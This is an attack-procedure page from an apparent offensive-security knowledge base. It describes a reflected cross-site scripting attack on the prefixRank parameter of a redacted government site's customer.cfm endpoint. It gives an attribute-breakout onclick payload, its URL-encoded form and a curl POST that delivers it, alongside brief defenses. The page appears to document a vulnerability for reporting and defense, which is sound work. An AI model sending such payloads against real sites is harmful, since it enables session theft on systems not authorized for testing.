---
tags:
  - xss-injection
  - javascript-execution
  - payload
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/inject-xss-payload-curl]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:12.915Z'
sub_techniques: []
id: 403a864a-c4bd-4c9c-a2ad-9823dd850e9e
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-XSS-Payload-into-PrefixRank

## Summary

This procedure modifies the duplicate registration request to inject a JavaScript payload into the prefixRank parameter, exploiting the reflection to execute arbitrary code in the browser upon error page load.

## Description

Building on the error reflection, the payload 'ryp3i"accesskey="x"onclick="alert(1)"//opk15' is URL-encoded and inserted into prefixRank, breaking out of the attribute context to trigger onclick execution. The target endpoint remains /ioss/site/customer.cfm. This leads to JavaScript running in the victim's session context, enabling theft of cookies or other impacts. Prerequisites include confirmed reflection from prior steps. Expected outcome is payload execution, verifiable by an alert dialog.

## Requirements

1. Confirmed input reflection from duplicate error step
2. URL-encoding capability for payload evasion
3. Browser context to observe execution (or proxy for testing)

## Defense

Defensive measures and detection strategies:

- Apply strict input validation and HTML/JS escaping on all form parameters
- Deploy Content Security Policy (CSP) to block inline script execution
- Scan for XSS payloads in WAF and log anomalous onclick or alert attempts

## Objectives

1. Inject and execute JavaScript via reflected input
2. Demonstrate potential for session-based attacks
3. Validate vulnerability for reporting or exploitation

## Instructions

### Step 1: Craft Payload

**Context**: Create the XSS payload that closes the HTML attribute and injects an onclick handler, then URL-encode it.

Payload: ryp3i"accesskey="x"onclick="alert(1)"//opk15
Encoded: ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15

### Step 2: Submit Injected Request

**Context**: Replace prefixRank in the duplicate POST with the encoded payload and submit to trigger execution.

**Command** ([[commands/inject-xss-payload-curl]]):
```bash
curl -X POST https://www.████.gov/ioss/site/customer.cfm \
  -d "email=user@example.com" \
  -d "prefixRank=ryp3i%22accesskey%3d%22x%22onclick%3d%22alert(1)%22%2f%2fopk15" \
  -d "firstName=Test" \
  -d "lastName=User" \
  --data-urlencode "other fields as required"
```

> This sends the malicious request. Expected output is the error page with executed JS, such as an alert(1) popup confirming success. Inspect the response to see the injected onclick attribute.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/inject-xss-payload-curl]]

## Tools Used


## Tags

- [[xss-injection]]
- [[javascript-execution]]
- [[payload]]
- [[web]]
